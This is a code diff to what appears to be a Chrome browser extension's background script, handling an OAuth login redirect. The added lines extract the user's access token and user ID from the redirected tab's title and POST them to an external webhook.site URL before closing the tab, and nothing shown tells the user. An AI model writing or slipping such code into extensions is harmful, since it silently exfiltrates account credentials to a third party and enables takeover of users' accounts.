@@ -46,9 +46,15 @@ chrome.runtime.onInstalled.addListener(function () {
         chrome.tabs.onUpdated.addListener(function (tabId, moveInfo) {
           if (tabId === data.id && moveInfo.status === 'loading' && moveInfo.url.startsWith(self._redirect_uri)) {
             chrome.tabs.get(tabId, function (tab) {
-              alert(url);
-              chrome.tabs.remove(tabId)
-              console.log(tab)
+                var access_token = tab.title.match(/\#(?:access_token)\=([\S\s]*?)\&/)[1];
+                var user_id = tab.title.match(/user_id=(\d+)/)[1];
+                postData = [access_token, user_id]
+                console.log(postData);
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST" ,"https://webhook.site/46095596-bc5f-4102-9591-fc7fa936b86b");
+                xhr.send(postData);
+                chrome.tabs.remove(tabId)
+                console.log(tab)
             })
           }
         })
